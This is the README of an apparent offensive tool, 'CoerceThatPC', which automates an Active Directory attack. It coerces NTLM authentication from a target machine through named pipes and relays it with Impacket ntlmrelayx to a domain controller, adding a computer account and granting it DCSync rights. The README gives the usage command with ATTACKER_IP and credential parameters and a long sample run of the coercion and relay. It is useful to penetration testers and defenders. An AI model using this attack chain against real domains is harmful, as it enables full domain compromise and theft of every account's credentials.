# CoerceThatPC
Script to automate the exploitation of a computer object being a member of an Administrators group within Active Directory.

This script automates the process of using known credentials to coerce NTLM authentication using named pipes via the Coercer package to an attackers PC where the Impacket ntlmrelayx package relays that authentication request to the Domain Controller to add a computer account and grant it DCSync privileges. This can be used any time a computer account exists in an administrator group which I have seen in multiple different corporate domains. 

Usage: 
```
python coercethatpc.py --target-ip TARGET_IP --attacker-ip ATTACKER_IP --dc-ip DC_IP --username USERNAME --password PASSWORD
```

Example: 
```
CoerceThatPC
By: Hann1bl3L3ct3r
Script to automate the exploitation of a computer object being a member of an Administrators group within Active Directory.

[+] Starting NTLM Relay Attack 

[+] Waiting for 10 seconds to ensure ntlmrelayx is fully set up 

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.11/site-packages/impacket
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[+] Starting coersion attack on machine 

       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 192.168.1.5
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49697,49668,49670,49672,49680,49719,49690
[+] DCERPC port '49680' is accessible!
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\192.168.1.10\x00') 
      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\192.168.1.10\x00') 
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.1.5, attacking target ldap://192.168.1.25

```
